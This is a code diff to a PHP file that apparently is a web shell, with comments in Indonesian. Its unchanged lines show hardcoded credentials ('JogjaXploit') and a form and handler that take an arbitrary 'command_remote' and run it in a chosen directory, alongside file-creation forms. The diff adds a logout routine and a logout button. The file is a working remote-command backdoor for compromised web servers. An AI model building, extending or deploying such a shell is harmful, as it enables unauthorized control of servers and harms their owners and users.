@@ -5,6 +5,20 @@ ob_start(); // Memulai output buffering
 $validUsername = 'JogjaXploit';
 $validPassword = 'Djaya3';
 
+// Proses logout
+if (isset($_GET['logout'])) {
+    session_unset(); // Hapus semua variabel sesi
+    session_destroy(); // Hancurkan sesi
+
+    // Hapus cookie PHPSESSID
+    if (isset($_COOKIE[session_name()])) {
+        setcookie(session_name(), '', time() - 3600, '/');
+    }
+
+    header("Location: login.php"); // Redirect ke halaman login
+    exit();
+}
+
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['command_remote'])) {
     $command_remote = $_POST['command_remote'];
     $target_dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : '.';
@@ -431,10 +445,15 @@ ob_end_flush();
             <input type="submit" value="Create File">
         </form>
 
-        <!-- Create New File Form -->
+        <!-- Remote Commands -->
         <form method="post" action="?path=<?php echo urlencode($path); ?>">
             <input type="text" name="command_remote" placeholder="Remote Command">
             <input type="submit" value="Execute Command">
+        </form>
+        
+        <!-- Log out -->
+        <form method="post" action="?logout=true">
+            <input type="submit" value="Log out">
         </form>
     </div>
 
